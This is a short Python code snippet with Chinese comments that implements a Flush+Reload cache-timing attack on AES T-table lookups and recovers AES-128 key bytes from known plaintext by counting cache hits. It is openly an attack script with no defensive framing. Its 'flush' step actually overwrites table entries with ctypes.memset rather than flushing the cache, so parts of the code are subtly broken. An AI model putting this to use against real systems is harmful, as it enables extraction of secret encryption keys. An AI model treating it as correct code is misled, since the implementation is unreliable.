# 假设我们监控第一个S盒查找（Te0）
# 实际攻击中需要知道T表地址

class FlushReload:
    def __init__(self, lib_path):
        self.lib = ctypes.CDLL(lib_path)
        # 获取Te0地址（通过符号）
        self.te0 = ctypes.cast(self.lib.Te0, ctypes.POINTER(ctypes.c_uint32))
        self.cache_lines = 256  # 每个索引对应一个缓存行

    def flush(self, idx):
        # 使用clflush指令
        ctypes.memset(ctypes.byref(self.te0[idx]), 0, 1)  # 模拟刷新

    def reload(self, idx):
        start = time.perf_counter_ns()
        _ = self.te0[idx]  # 访问
        end = time.perf_counter_ns()
        return end - start

    def monitor(self, num_samples=1000):
        # 收集每个索引的访问时间
        timings = np.zeros((256, num_samples))
        for sample in range(num_samples):
            for idx in range(256):
                self.flush(idx)
            # 等待受害者执行一次AES加密
            time.sleep(0.001)
            for idx in range(256):
                timings[idx][sample] = self.reload(idx)
        return timings

# 分析：缓存命中的索引对应被访问的T表条目
# 对于AES-128，第一轮密钥加后，索引 = 明文字节 ^ 密钥字节
# 如果已知明文，可以通过统计哪些索引频繁命中来推断密钥

def recover_key_byte(plaintext_byte, timings):
    # 对每个候选密钥字节（0-255），计算对应的索引
    # 统计该索引的缓存命中次数（时间低于阈值）
    threshold = 100  # 纳秒，需校准
    hits = []
    for k in range(256):
        idx = plaintext_byte ^ k
        count = np.sum(timings[idx] < threshold)
        hits.append(count)
    # 命中次数最多的候选密钥字节
    return np.argmax(hits)

